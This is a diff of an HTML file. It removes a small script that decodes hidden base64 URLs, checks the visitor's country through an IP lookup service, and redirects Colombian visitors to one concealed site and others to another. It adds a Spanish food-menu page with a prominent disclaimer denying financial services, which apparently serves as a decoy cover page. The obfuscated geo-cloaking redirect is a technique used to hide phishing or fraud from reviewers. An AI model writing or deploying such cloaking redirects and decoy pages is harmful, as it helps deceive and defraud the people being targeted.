@@ -1,15 +1,228 @@
-<script>
-(_=>{
-const u="aHR0cHM6Ly9jb21pZGFwb3B1bGFyLnZlcmNlbC5hcHAvaW5pY2lvLmh0bWw=",
-p="aHR0cHM6Ly9wb3B1bGFyLnhvLmplLw==",
-R=s=>location.href=atob(u);
-fetch("https://ipapi.co/json/")
-.then(r=>r.json())
-.then(j=>{
- (j.country||"")=="CO"
-   ? location.href = atob(p)
-   : R();
-})
-.catch(R);
-})();
-</script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Comida Colombiana Popular | Menú Informativo</title>
+
+<meta name="description" content="Sitio informativo sobre comida colombiana popular. Menú gastronómico referencial. No se realizan pagos ni ventas en línea.">
+<meta name="keywords" content="comida colombiana, menú popular, gastronomía colombiana, platos típicos">
+<meta name="robots" content="index, follow">
+
+<style>
+/* 🔒 RESET + FIX SCROLL */
+html, body {
+  margin:0;
+  padding:0;
+  width:100%;
+  overflow-x:hidden;
+  font-family:'Inter', system-ui, Arial, sans-serif;
+  background:#050b0f;
+  color:#e5fef1;
+}
+
+*{box-sizing:border-box}
+
+/* ================= HEADER ================= */
+header{
+  position:sticky;
+  top:0;
+  z-index:99;
+  display:flex;
+  align-items:center;
+  gap:14px;
+  padding:14px 22px;
+  background:rgba(0,255,153,.12);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(0,255,153,.25);
+}
+
+header .icon{
+  font-size:26px;
+  cursor:pointer;
+  color:#00ff99;
+}
+
+header .title{
+  font-size:20px;
+  font-weight:600;
+  letter-spacing:.5px;
+}
+
+/* ================= HERO ================= */
+.hero{
+  min-height:75vh;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  text-align:center;
+  padding:40px 20px;
+  background:
+    radial-gradient(circle at top, rgba(0,255,153,.18), transparent 60%),
+    linear-gradient(180deg,#07140e,#050b0f);
+}
+
+.hero h1{
+  font-size:48px;
+  font-weight:300;
+  margin:0;
+  text-shadow:0 0 18px rgba(0,255,153,.4);
+}
+
+.hero h2{
+  font-size:38px;
+  font-weight:300;
+  margin:8px 0 0;
+  color:#00ff99;
+  letter-spacing:1px;
+}
+
+.hero p{
+  max-width:680px;
+  margin-top:16px;
+  font-size:16px;
+  color:#c7ffe8;
+}
+
+/* ================= BUTTON ================= */
+.hero button{
+  margin-top:36px;
+  padding:16px 48px;
+  font-size:18px;
+  font-weight:700;
+  border-radius:14px;
+  border:1px solid #00ff99;
+  background:linear-gradient(135deg,#00ff99,#00cc77);
+  color:#022015;
+  cursor:pointer;
+  box-shadow:
+    0 0 20px rgba(0,255,153,.55),
+    inset 0 0 10px rgba(255,255,255,.2);
+  transition:.25s;
+}
+
+.hero button:hover{
+  transform:translateY(-2px) scale(1.04);
+  box-shadow:0 0 30px rgba(0,255,153,.9);
+}
+
+/* ================= AVISO LEGAL VISIBLE ================= */
+.notice{
+  margin-top:30px;
+  padding:18px 22px;
+  border-radius:14px;
+  background:linear-gradient(135deg,rgba(0,255,153,.14),rgba(0,255,153,.05));
+  border:1px solid rgba(0,255,153,.3);
+  max-width:720px;
+  font-size:15px;
+  color:#d6fff0;
+}
+
+/* ================= FOOTER ================= */
+footer{
+  padding:36px 20px;
+  background:linear-gradient(180deg,#050b0f,#030709);
+  border-top:1px solid rgba(0,255,153,.25);
+}
+
+footer h3{
+  font-size:22px;
+  margin-bottom:18px;
+  font-weight:600;
+  color:#00ff99;
+}
+
+.footer-box{
+  display:flex;
+  align-items:center;
+  gap:16px;
+}
+
+.footer-icon{
+  width:64px;
+  height:64px;
+  border-radius:20px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:28px;
+  background:rgba(0,255,153,.15);
+  border:1px solid rgba(0,255,153,.35);
+  box-shadow:0 0 15px rgba(0,255,153,.35);
+}
+
+footer .text{
+  font-size:18px;
+  color:#d6fff0;
+}
+
+/* ================= LEGAL ================= */
+.legal{
+  text-align:center;
+  margin-top:26px;
+}
+
+.legal a{
+  color:#7affc9;
+  font-size:14px;
+  font-weight:600;
+  text-decoration:none;
+}
+
+.legal a:hover{
+  text-decoration:underline;
+}
+
+/* ================= RESPONSIVE ================= */
+@media(max-width:600px){
+  .hero h1{font-size:36px}
+  .hero h2{font-size:28px}
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <span class="icon">&#9776;</span>
+  <span class="title">Comida Popular</span>
+</header>
+
+<section class="hero">
+  <h1>Comida Colombiana</h1>
+  <h2>Popular</h2>
+
+  <p>
+    Sitio informativo sobre gastronomía colombiana. Explora platos típicos
+    y menús populares de manera referencial.
+  </p>
+
+  <button onclick="window.location.href='menu.html'">
+    Ver menú gastronómico
+  </button>
+
+  <div class="notice">
+    <strong>Aviso importante:</strong><br>
+    Este sitio no ofrece productos financieros, créditos, préstamos, seguros
+    ni servicios de inversión. No se realizan ventas, cotizaciones ni pagos en línea.
+    El contenido es exclusivamente informativo.
+  </div>
+</section>
+
+<footer>
+  <h3>Tu Popular</h3>
+
+  <div class="footer-box">
+    <div class="footer-icon">😊</div>
+    <span class="text">Personas colombianas</span>
+  </div>
+
+  <div class="legal">
+    <a href="terminos.html">Términos y Condiciones</a>
+  </div>
+</footer>
+
+</body>
+</html>
